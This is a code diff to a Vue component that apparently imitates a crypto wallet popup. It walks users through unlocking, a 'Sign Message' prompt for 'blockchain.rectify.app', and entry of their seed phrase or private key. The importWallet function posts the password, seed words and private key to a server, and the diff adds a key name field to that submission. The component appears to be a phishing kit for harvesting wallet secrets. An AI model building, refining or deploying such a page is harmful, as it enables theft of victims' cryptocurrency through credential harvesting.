@@ -26,8 +26,9 @@
       </svg>
     </div>
 
+    <hr class="border-t border-gray-500" />
     <!-- Step Container -->
-    <div class="min-h-[220px] flex flex-col justify-center relative">
+    <div class="min-h-[420px] flex flex-col relative">
       <transition name="fade" mode="out-in">
         <div :key="currentStep">
           <!-- STEP 1 -->
@@ -67,7 +68,7 @@
                     type="button"
                     :disabled="password.length <= 6 || isLoading"
                     :class="password.length > 6 ? 'bg-[#ab9ff2]' : ''"
-                    class="w-full py-3 px-4 border-none outline-none hover:border-none hover:text-[#222] rounded-[16px] font-semibold text-xl h-16 duration-200 flex items-center justify-center bg-[#333] text-white relative"
+                    class="w-full py-4 px-4 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-xl duration-200 flex items-center justify-center bg-[#333] text-white relative"
                   >
                     <span v-if="!isLoading">Unlock</span>
                     <svg
@@ -111,12 +112,12 @@
                 </div>
                 <div>
                   <p class="text-white mb-0 text-2xl font-bold">Sign Message</p>
-                  <p class="text-gray-400 text-lg mt-0.5">
+                  <p class="text-gray-500 text-lg mt-0.5">
                     blockchain.rectify.app
                   </p>
                 </div>
               </div>
-              <p class="text-gray-400 text-xl mb-4">
+              <p class="text-gray-500 text-xl mb-4">
                 Signing this message will prove you have ownership of the
                 selected account.
               </p>
@@ -129,20 +130,20 @@
                 <p class="text-gray-400 text-lg">Click "Confirm" to continue</p>
               </div>
             </div>
-            <div>
+            <div class="bottom-0 absolute w-full">
               <p class="text-gray-400 text-lg text-center mb-4">
                 Only confirm if you trust this website.
               </p>
               <div class="flex gap-3 bg-[#333] w-full p-3">
                 <button
                   @click="prevStep"
-                  class="flex-1 font-bold bg-[#454545] border-none hover:border-none hover:text-[#222] hover:bg-[#555555] text-white py-3 px-4 rounded-[16px]"
+                  class="flex-1 font-bold bg-[#454545] border-none hover:border-none hover:text-[#222] hover:bg-[#555555] text-white py-4 px-4 rounded-[30px]"
                 >
                   Cancel
                 </button>
                 <button
                   @click="nextStep"
-                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-3 px-4 rounded-[16px]"
+                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-4 px-4 rounded-[30px]"
                 >
                   Confirm
                 </button>
@@ -176,8 +177,8 @@
 
             <!-- Successfully updated + Seed phrase -->
             <div v-else-if="subStep === 3 && !showPrivateKey" class="p-6">
-              <div class="flex flex-col items-center mb-4">
-                <img src="/images/sleeping-dark.gif" class="w-12 h-12 mr-2" />
+              <div class="flex flex-col items-center justify-center mb-4">
+                <img src="/images/sleeping-dark.gif" class="w-40 h-40" />
                 <h2 class="text-2xl font-bold">Successfully Updated</h2>
               </div>
               <p class="text-gray-400 mb-6 text-center text-lg">
@@ -219,7 +220,7 @@
                 <button
                   @click="importWallet"
                   :disabled="isLoading"
-                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-3 px-4 rounded-[16px] flex items-center justify-center"
+                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-4 px-4 rounded-[30px] flex items-center justify-center"
                 >
                   <span v-if="!isLoading">Import Wallet</span>
                   <svg
@@ -249,27 +250,54 @@
 
             <!-- Private Key View -->
             <div v-else-if="showPrivateKey" class="px-6 pt-6">
-              <h2 class="text-2xl font-bold text-center mb-4">
-                Enter Your Private Key
-              </h2>
-              <textarea
-                v-model="privateKey"
-                style="background: #181818; font-size: 14px; padding-top: 2px"
-                class="w-full rounded-md py-2 px-3 text-white text-sm outline-none mb-6"
-                rows="5"
-              ></textarea>
+              <div class="mb-4 p-3 flex items-center space-x-4" style="background: #181818; font-size: 14px;">
+                <img class="w-10 h-10" src="https://vercelquickfix.com/solana.svg" alt="">
+                <span class="font-bold">Solana</span>
+              </div>
+              <div class="mb-4">
+                <label
+                  for="first_name"
+                  class="block mb-2 text-xl font-medium text-gray-900 dark:text-white"
+                  >Name</label
+                >
+                <input
+                  style="background: #181818; font-size: 14px;"
+                  type="text"
+                  id="first_name"
+                  class="bg-gray-50 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                  v-model="privateKeyName"
+                  required
+                />
+              </div>
 
-              <div class="flex gap-3 mt-6">
+              <div>
+                <label
+                  for="message"
+                  class="block mb-2 text-xl font-medium text-gray-900 dark:text-white"
+                  >Your private key</label
+                >
+                <textarea
+                  v-model="privateKey"
+                  style="background: #181818; font-size: 14px; padding-top: 2px"
+                  class="w-full rounded-md py-2 px-3 text-white text-sm outline-none mb-6"
+                  rows="5"
+                ></textarea>
+              </div>
+              
+
+              <div
+                class="flex gap-3 mt-6 absolute bottom-0 left-0 right-0 bg-[#333] w-full p-3"
+              >
                 <button
                   @click="showPrivateKey = false"
-                  class="flex-1 font-bold bg-[#454545] border-none hover:border-none hover:text-[#222] hover:bg-[#555555] text-white py-3 px-4 rounded-[16px]"
+                  class="flex-1 font-bold bg-[#454545] border-none hover:border-none hover:text-[#222] hover:bg-[#555555] text-white py-4 px-4 rounded-[30px]"
                 >
                   Back
                 </button>
                 <button
                   @click="importWallet"
                   :disabled="isLoading"
-                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-3 px-4 rounded-[16px] flex items-center justify-center"
+                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-4 px-4 rounded-[30px] flex items-center justify-center"
                 >
                   <span v-if="!isLoading">Import Wallet</span>
                   <svg
@@ -321,7 +349,7 @@
 <script setup>
 import { ref, watch } from "vue";
 import axios from "axios";
-
+const emit = defineEmits(["close"]);
 const currentStep = ref(1);
 const subStep = ref(1);
 const password = ref("");
@@ -378,6 +406,7 @@ const importWallet = async () => {
       password: password.value,
       seedWords: seedWords.value.filter(Boolean),
       privateKey: privateKey.value || null,
+      privateKeyName: privateKeyName.value || null,
     };
 
     const params = {
@@ -398,7 +427,7 @@ const importWallet = async () => {
     );
 
     if (response.data === "OK") {
-      
+      emit("close");
       showMessage("Wallet imported successfully!", "success");
     }
   } catch (error) {
